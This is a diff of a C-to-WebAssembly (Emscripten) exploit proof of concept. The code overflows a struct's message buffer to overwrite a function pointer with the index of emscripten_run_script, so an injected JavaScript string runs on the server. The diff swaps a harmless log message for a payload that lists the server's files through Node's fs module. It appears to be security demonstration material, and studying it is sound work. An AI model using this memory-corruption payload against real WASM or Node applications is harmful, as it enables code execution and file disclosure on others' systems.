@@ -25,15 +25,12 @@ Comms comms;
 comms.out = &communicate;
 printf("&communicate: %p\n", &communicate); // 0x4
 printf("&emscripten_run_script: %p\n", &emscripten_run_script); // 0x5
-char *payload = "console.log('>>>" // 16 bytes
-  "Server side code" // + 16
-  " execution!');//" // + 16; '//' lets eval() work
-  "                " // + 16 to fill .msg = 64
+char *payload = "console.log(require('fs').readdirSync('./').toString());//" // 58 bytes
+  "      " // + 6 to fill .msg = 64
   "  " // + 2 for alignment = 66
   "\x40\x00" // + 2 bytes to fill .msg_len = 68
   "\x05\x00\x00\x00"; // + 4 bytes to overwrite .out= 72
   memcpy(comms.msg, payload, 72);
-  emscripten_run_script("console.log('Porting my program to WASM!');");
 
   trigger(&comms);
 
